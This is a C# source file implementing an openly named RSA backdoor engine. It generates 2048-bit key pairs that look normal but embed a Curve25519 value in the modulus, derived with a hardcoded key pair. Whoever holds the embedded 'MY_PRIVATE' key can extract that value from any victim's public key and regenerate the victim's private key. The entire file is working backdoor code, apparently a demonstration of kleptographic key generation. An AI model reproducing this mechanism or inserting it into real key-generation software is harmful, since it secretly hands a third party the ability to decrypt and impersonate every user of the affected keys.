using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Chaos.NaCl;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Utilities;

namespace RsaBackdoor.Backdoor
{
	class RsaBackdoorEngine
	{
		private const string MY_PUBLIC_STR = "06F1A4EDF328C5E44AD32D5AA33FB7EF10B9A0FEE3AC1D3BA8E2FACD97643A43";
		private static readonly byte[] MY_PUBLIC = StringToByteArray(MY_PUBLIC_STR);

		private const string MY_PRIVATE_STR = "BDB440EBF1A77CFA014A9CD753F3F6335B1BCDD8ABE30049F10C44243BF3B6C8";
		private static readonly byte[] MY_PRIVATE = StringToByteArray(MY_PRIVATE_STR);

		public static byte[] StringToByteArray(string hex)
		{
			return Enumerable.Range(0, hex.Length)
							 .Where(x => x % 2 == 0)
							 .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
							 .ToArray();
		}

		public void Replace(byte[] orig, byte[] replace, int offset)
		{
			for (int i = 0; i < replace.Length; i++)
			{
				orig[i + offset] = replace[i];
			}
		}

		public AsymmetricCipherKeyPair BuildRandomKey()
		{
			byte[] seed, payload;
			MakeSeedAndPayload(out seed, out payload);
			return BuildKey(seed, payload);
		}

		public AsymmetricCipherKeyPair BuildKeyFromPayload(byte[] payload)
		{
			var seed = MontgomeryCurve25519.KeyExchange(payload, MY_PRIVATE);
			return BuildKey(seed, payload);
		}

		public AsymmetricCipherKeyPair BuildKey(byte[] seed, byte[] payload)
		{

			var publicExponent = new BigInteger("10001", 16);

			var keygen = new RsaKeyPairGenerator();
			keygen.Init(new RsaKeyGenerationParameters(publicExponent, new SecureRandom(new SeededGenerator(seed)), 2048, 80));
			var pair = keygen.GenerateKeyPair();

			var paramz = ((RsaPrivateCrtKeyParameters)pair.Private);

			var modulus = paramz.Modulus.ToByteArray();
			Replace(modulus, payload, 80);


			var p = paramz.P;
			var n = new BigInteger(modulus);
			var preQ = n.Divide(p);
			var q = preQ.NextProbablePrime();

			return ComposeKeyPair(p, q, publicExponent);
		}

		private void MakeSeedAndPayload(out byte[] seed, out byte[] payload)
		{
			var rnd = new SecureRandom();
			var priv = new byte[32];
			rnd.NextBytes(priv);
			payload = MontgomeryCurve25519.GetPublicKey(priv);
			seed = MontgomeryCurve25519.KeyExchange(MY_PUBLIC, priv);
		}

		public static bool CheckPayload(byte[] modulus, byte[] payload, int pos)
		{
			for (var i = pos; i < pos + payload.Length; i++)
			{
				if (modulus[i] != payload[i - pos])
				{
					return false;
				}
			}
			return true;
		}


		public AsymmetricCipherKeyPair ComposeKeyPair(BigInteger p, BigInteger q, BigInteger publicExponent)
		{
			if (p.Max(q).Equals(q))
			{
				var tmp = p;
				p = q;
				q = tmp;
			}

			var modulus = p.Multiply(q);

			var p1 = p.Subtract(BigInteger.One);
			var q1 = q.Subtract(BigInteger.One);
			var phi = p1.Multiply(q1);
			var privateExponent = publicExponent.ModInverse(phi);
			var dP = privateExponent.Remainder(p1);
			var dQ = privateExponent.Remainder(q1);
			var qInv = q.ModInverse(p);

			var priv = new RsaPrivateCrtKeyParameters(modulus, publicExponent, privateExponent, p, q, dP, dQ, qInv);

			return new AsymmetricCipherKeyPair(new RsaKeyParameters(false, priv.Modulus, publicExponent), priv);
		}


		public byte[] ExtractPayload(RsaKeyParameters pub)
		{
			var modulus = pub.Modulus.ToByteArray();
			var payload = new byte[32];
			Array.Copy(modulus, 80, payload, 0, 32);
			return payload;
		}
	}
}
